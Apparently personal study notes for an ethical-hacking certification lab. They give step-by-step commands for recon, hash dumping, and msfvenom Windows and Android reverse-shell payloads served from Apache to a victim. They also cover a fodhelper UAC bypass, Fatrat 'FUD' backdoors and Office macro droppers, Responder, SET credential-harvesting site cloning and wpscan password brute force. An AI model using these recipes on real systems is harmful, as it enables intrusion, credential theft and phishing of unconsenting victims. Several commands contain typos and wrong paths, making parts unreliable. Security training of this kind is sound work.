## Footprinting and Recon
1) Tools Used
	1) Ping
	2) Firebug = wappylyzer but  mode detailed
	3) WinHTTrack = mirror a website , download its css , images html , js media content etc .
	4) Path anaylyzer pro = It basically trace the path of the IP from host to destination add target port and set trace to timed trace
	5) Metasploit
	    1)  nmap = here is used to scan the subnet
	    2) nmap -Pn -sS -sN -A -oX Test 10.10.10.0/24
	    3) type db_import Test
	    4) type hosts
	    5) scan using smb/version/scanner

## Enumeration

 Tools Used
 1) On Windows and Kali
	1) gni_setup.exe = scan the entire network from 10.10.10.1 to 10.10.10.25
	2) ipscan25.exe = same as gni_setup.exe `10.10.10.1-25`
	3) Netbios Enumerator = enumerate everything like registry shares
	4) nmap GUI = nmap -O IP
	5) nbstat -A IP list all the shares
	6) AD_explorer.exe which users has admin privs etc
	7) enum4linux -u username -p pass  -P IP
	8) enum4linux -u username -p pass  -S  IP this will list all the shares
2) In Metasploit
    1) **nmap -sP 10.10.10.0/24** this will scan all the devices present on the given network
    2) nmap -sS IP stealthy scan
    3) nmap -sU  -p161  --script=snmp-brute IP
    4) msfconsole -> use auxilliary/scanner/snmp/snmp_login after getting something
    5) use auxilliary/scanner/snmp/snmp_enum
## Vulnerability Analysis
1) Tools Used
	1) Nessus -go to policies -> create a new policy -> advances scan -> In discovery -> host discovery -> turn of ping the remote hosts -> set max number of concurrent TCP scan per host and scan  as   **unlimited**  -> credential add on scans page -> create a new scan ->
	2) Nikto

## System Hacking

Tools Used
1) **pwdump7.exe** this will show all the password hashes and password
	1) `pwdump7.exe > C:\hashes.txt`
2) Download ophcracl.exe load the hashes and choose vista free and complete the hashcracking
3) Tools to create for rainbow tables
    1) winrtgen
		    1) click add table
		    2) for hash select NTLM
		    3) Min length as 4 Max  length as 6 chain count as 400000
		    4) charset lower alpha
4) command for payload   `msfvenom -p windows/meterpreter/reverse_tcp  --platform windows -a x86 -f exe LHOST=kali_IP LPORT=listening_port -o /root/Desktop/Test.exe`
5)  create a folder ` mkdir /var/www/html/share`  and then `chmod -R 755 /var/www/html/share` 
6) change the ownership of the folder to www-data by `chown -R www-data:www-data /var/html/share`
7) `cp /root/Desktop/Test.exe  /var/www/html/share`
8) service apache2 start
9) msfconsole , use exploit/multi/handler,  set payload windows/meterpreter/reverse_tcp  , set lport to 4444 , run
10) Go to victim download and run and done
11) in meterpreter shell type  `run vnc`  
**Escalating privs** 
1) On kali
    1) `msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86/shikata_ga_nai -b "\x00" LHOST=victim_IP -f exe > Desktop/exploit.exe`
    2) repeat the steps 5 to 7 and replace Test.exe with exploit.exe
    3) `ls -la /var/www/html/ | grep share`
    4) service apache2 start
    5) repeat steps 10-11 and
    6) shell background
    7) use exploit/windows/local/bypassuac_fodhelper
    8) show options set payload w/m/r_tcp
    9) then getsystem
    10) run post  windows/gather/smart_hashdump 

**Steganography**
Tools
1) Snow
    1) create a file readme.txt
    2) then using snow type
        1) `snow -C "My swiss bank number is  34567" -p "magic" readme.txt readme2.txt ` here magic is the password
    2) to read the file readme2.txt
            1) `snow -C -p "magic" readme.txt `
2) **Openstego**
 for hiding
    1) choose the file to be encrypted
    2) choose the document to be encrypted in
    3) done
for extracting
    1) choose the encrypted file choose the location done
3) **QuickStego**
    1) for hiding again choose the image , choose the text file done
    2) for extracting just open the encrypted image
4) **Auditpol**
	 1) in CMD type `auditool /get /category:*`
	 2) To enable the audit policies type `auditpol /set /category:"system","account login" /success:enable /failure:enable`
	 3) to clear all the audit policies type the following command `auditpol /clear /y`
5) **CovertTCP**
	1) in kali
	2) create folder in desktop
	3) type  `echo "Secret Messsage" > message.txt`
	4) go to files -> other locations -> in address field type `smb://IP/`
	5) timming on youtube 1:50:00 -- 2:12:00
6) **Fatrat**
	1) choose 6 create a Fud  backdoor 1000% with pwnWinds
	2) the choose 3 exe with apache + powershell
	3) for LHOST type kali IP and LPORT 4444
	7) in base files enter payload
	8) choose `windows/meterpreter/reverse_tcp`
	9) press enter 2-3 times then press 8 to go to main menu
	10) choose 7 create backdoor with Ms office
	11) then choose 2 microsoft office macro on windows
	12) Set kali IP and port number
	13) for base name in output file type badDoc
	14) type y
	15) in the Path /root/Fatrat/output/payload.exe
	16) choose payload as step 5
	17) create /var/www/html/share then similar steps service apache2 start ...............
**Responder** 
1) responder -I eth0
2) go the windows run `\\CEH-TOOLS`
## Social Engineering 

Use SET
social engineering toolkit
1) select spear phishing
2) choose credential harvesting
3) choose site cloner enter the details
4) voila


## Session Hijacking

Tools Used
1) OWASP ZAP (here the attacker itsef is windows host)
	1) in chrome -> settings -> system -> proxy settings -> LAN settings -> check proxy server -> add attacker IP address and port to 8080 -> OK
	2) On the main windows click do not persist
	3) After the main screen appears click the `+`  symbol
	4) For ZAP to work as a proxy go to Tools -> options -> then search for Local Proxies -> add attacker address -> DO NOT CHANGE THE PORT
	5) Using orange circle set a break point
	6) go to the website we want to capture request on
	7) capture request and click **submit and step to next request or response**  change the web site to your wanted website  and done

## Hacking Web Servers

Tools Used
1) skipfish
    1) `skipfish -o /root/test -S /usr/share/skipfish/dictionaries/complete.wl http://IP:port`
2) httprecon put IP port done
3) id_serve.exe = vuln analysis maybe
4) hydra = hydra -u username -p password -S IP
5) Uniscan Web Server fingerprinting kali
	1) `uniscan -u  http://IP:port/CEH -q`
	2) `uniscan -u  http://IP:port/CEH -we`
	3) `uniscan -u  http://IP:port/CEH -d`
		1)  -w = check for robots.txt
		2)  -e = check for sitemap.xml
		3)  -d = dynamic

## Hacking Web Applications

1) Parameter Tampering = changing the last parameter = IDOR
2) XSS = cross site scripting
3) Enumeration and Hacking a web Application Using WPscan and metasploit  we can also use nmap to enumerate the users in wordpress
	1) For WPSCAN
		1) `wpscan --url https://example/ --enumerate u (To enumerate the user)`
		2) `wpscan --url http://172.16.0.27:8080/CEH/ -usernames elliot  -P /path/pass.txt`
		3) ` wpscan --url https://example/ --enumerate vp (To enumerate vuln plugins)`
	2) For Metasploit
		1) `use auxiliary/scanner/http/wordpress_login_enum`
	3) Exploiting remote command execution login -> set the DVWA security to low  -> issue the commands
		1) | hostname 

4) Vega 
	1) Add IP see the vuln
5) Acutenix
	1) Vuln Scanner
## Cryptography

1) **Hashcalc**
	1) calculating the hash of a  particular file -> Data format ->  File  ->  upload the file then check the hash
	2) either check the SHA1 Hash of a text enter the text in the field or upload the file
2) **MD5 calculator**
	1) Calculating MD5 Hashes
3) **BCTextEncoder**
	1) enter the text and encode and enter the passphrase
	2) then click decode and then enter the passphrase and done
4) **creating and using self signed certificates**
	1) go windows administrative tools
	2) then IIS manager
	3) click  server certificate add one name
	4) then go to the website in connections then binding on the right side then add the hostname and set port to 443 then add certificate and done
5) **Veracrypt**
	1) For Encrypting
		1) open VC then create new volume
		2) create encrypted file container
		3) Standart veracrypt volume
		4) select a file creata folder on desktop
		5) select the folder size and then enter the password
	2) For Decrypting
		1) select the folder and select a drive
		2) click mount
		3) enter the password
6) **Cryptool**
	1) For Encrypting
		1) open file -> type something
		2) click encrypt/decrypt choose symmetric encryption > RC2 > 8 bits > 05 > click encrypt  > save the file
	2) For Decrypting
		1) open the tool > drag the file
		2) choose the appropriate settings > decrypt

## Hacking Mobile Applications

1) Creating binary payloads to hack kali linux
	1) creating server and testing devices located in the network which are prone to attacks
	2)  Attacking the device using simple backdoor and monitor the system activity
2)  In the machine click the device menu go the terminal emulator press su to get root
3) type ip addr 10.10.10.69/24 dev eth0 to add the ip
4) open Kali
	1)  service postgresql start
	2) msfvenom -l to view all the payloads
	3) to generate a reverse android payload use the command `msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=kali_IP R > Desktop/Backdoor.apk`
	4) create a folder ` mkdir /var/www/html/share`
	5) change file perms of the folder to 755 using the command **chown  -R 755 /var/www/html/share**
	6) change the ownership of the folder to www-data by **chown -R www-data:www-data /var/html/share**
	7)  **cp /root/Desktop/backdoor.apk /var/www/html/share**
	8)  service apache2 start
	9) open metasploit start listener **use exploit/multi/handler** set payload **android/meterpreter/reverse_tcp**
	10) set lhost to kali IP add
	11) exploit -j -z
5) go to the android emulator open browser type `http://kali_IP/share`
6) download and install and open
7) in kali
	1) session -i